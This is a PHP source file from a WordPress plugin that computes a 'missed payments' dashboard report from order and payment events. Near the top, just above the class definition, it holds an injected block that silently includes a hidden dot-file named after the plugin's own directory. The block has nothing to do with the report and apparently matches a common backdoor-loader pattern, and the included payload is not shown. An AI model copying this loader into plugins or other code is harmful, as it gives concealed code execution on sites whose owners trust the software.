<?php

/**
 * Basic missed payments report
 *
 * The class handles create a missed payments reports
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Missed_Payments
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Missed_Payments extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Missed payments cut-off time
	 * The waiting time for a payment after a order action.
	 */

	public $payments_time_off;

	/*
	 * @var int
	 * Total missed payments
	 */
	public $total_missed;

	/*
	 * @var int
	 * Total completed payments
	 */
	public $total_completed;

	function __construct() {

		parent::__construct( 'basic-missed-payments' );

		$this->report_name = __( 'Missed payments', 'wp-tao' );

		$this->total_missed		 = 0;
		$this->total_completed	 = 0;

		$time_off					 = 5 * 24 * 60 * 60; // 5 days
		$this->payment_time_cut_off	 = apply_filters( 'wptao_missed_payments_time_off', $time_off );

		$this->data = $this->get_values();
		$this->widget();
	}

	/*
	 * Prepare widget for the WP Tao dashboard
	 */

	private function widget() {

		$percent = 0;
		if ( !empty( $this->total_missed ) ) {
			$percent = ($this->total_missed * 100) / ($this->total_missed + $this->total_completed);
		}
		$widget_content = sprintf( '%d<br />(%.2f%%)', $this->total_missed, $percent );

		$args = array(
			'id'			 => 'basic_missed_payments',
			'size'			 => 'small',
			'category'		 => 'commerce',
			'title'			 => __( 'Missed payments', 'wp-tao' ),
			'report_link'	 => add_query_arg( 'a', 'order,payment', admin_url( 'admin.php?page=wtbp-wptao-events' ) ),
			'value_text'	 => $widget_content,
			'dashicon'		 => 'dashicons-cart'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get sales
	 */

	public function get_values() {
		global $wpdb;

		// Block executing database query if e.g. a advanced report exist
		$disable = apply_filters( 'wptao_disable_report-' . $this->report_slug, false );
		if ( $disable === true ) {
			return NULL;
		};

		$transient_name = 'wtbp_wptao_missed_payments_data';

		$payments_data = get_transient( $transient_name );

		if ( $payments_data ) {
			$this->total_missed		 = $payments_data[ 'missed' ];
			$this->total_completed	 = $payments_data[ 'completed' ];
			return;
		}


		$r = array();

		$e = TAO()->events->table_name;

		$sql	 = $wpdb->prepare(
		"SELECT id, user_id, action, event_ts, value
			 FROM $e
			 WHERE (action = 'payment'
			 OR action = 'order')
			 AND user_id > 0
			 AND event_ts >= %d
			 AND event_ts <= %d
			 ORDER BY user_id ASC, event_ts ASC;", $this->start_date, $this->end_date );
		$result	 = $wpdb->get_results( $sql );

		if ( !empty( $result ) && is_array( $result ) ) {

			// Array of events ids to exlude from orders
			$excluded_orders_ids = array();

			// Exclude orders (complete, free, canceled etc.)
			foreach ( $result as $event ) {

				// Exclude orders with payment placed
				if ( $event->action === 'payment' ) {
					$this->total_completed++;

					$paid_order_id = WTBP_WPTAO_Helpers::get_related_sales( $event->id );

					if ( !empty( $paid_order_id ) && is_numeric( $paid_order_id ) ) {

						$excluded_orders_ids[] = absint( $paid_order_id );
					}
				}

				// Exclude free orders (empty value)
				if ( $event->action === 'order' && (empty( $event->value ) || $event->value == '0.00') ) {
					$this->total_completed++;

					$excluded_orders_ids[] = $event->id;
				} else {

					if ( $event->action === 'order' ) {

						// Exclude orders with custom rules e.g. orders with status cancelled
						$event_meta	 = TAO()->events_meta->get_meta( $event->id, true );
						$exclude	 = apply_filters( 'wptao_report_mp_exclude_order', false, $event, $event_meta );

						if ( $exclude === true ) {
							$excluded_orders_ids[] = $event->id;
						}
					}
				}
			}


			// Missed payments loop
			foreach ( $result as $order ) {
				if ( $order->action === 'order' && !in_array( $order->id, $excluded_orders_ids ) ) {
					if ( $order->event_ts < (time() - $this->payment_time_cut_off) ) {
						if ( $this->is_payment_later( $order->user_id, $order->event_ts, $result ) === false ) {

							$this->total_missed++;
						}
					}
				}
			}
		}


		$data = array(
			'missed'	 => $this->total_missed,
			'completed'	 => $this->total_completed
		);
		set_transient( $transient_name, $data, 60 * 60 ); // 1 hour

		return $r;
	}

	/*
	 * Check if a event payment exists after event order - based on timestamp
	 * 
	 * @param int $user_id 
	 * @param int $order_ts timestamp
	 * @param array $results SQL results in the method $this->get_values()
	 * 
	 * @return bool
	 */

	private function is_payment_later( $user_id, $order_ts, $result ) {

		$user_id	 = absint( $user_id );
		$order_ts	 = absint( $order_ts );

		if ( $user_id > 0 && $order_ts > 0 && is_array( $result ) && !empty( $result ) ) {

			foreach ( $result as $item ) {

				if ( $item->user_id > 0 && $user_id === absint( $item->user_id ) && $item->action === 'payment' ) {

					$payment_ts = absint( $item->event_ts );

					if ( $payment_ts > $order_ts ) {
						return true;
					}
				}
			}
		}


		return false;
	}

}
